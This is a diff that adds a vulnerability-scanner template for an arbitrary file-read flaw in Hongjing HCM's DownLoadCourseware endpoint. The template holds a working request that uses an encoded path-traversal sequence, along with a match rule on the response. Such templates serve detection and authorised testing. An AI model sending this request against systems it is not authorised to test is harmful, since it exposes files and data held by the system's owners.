@@ -1,0 +1,11 @@
+name: 宏景HCM-DownLoadCourseware-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=6ZLV47bgJw71cMaltrlVM3dCFpcd5ypU
+    expression:
+      status: 200
+      body_all: ["fonts"]
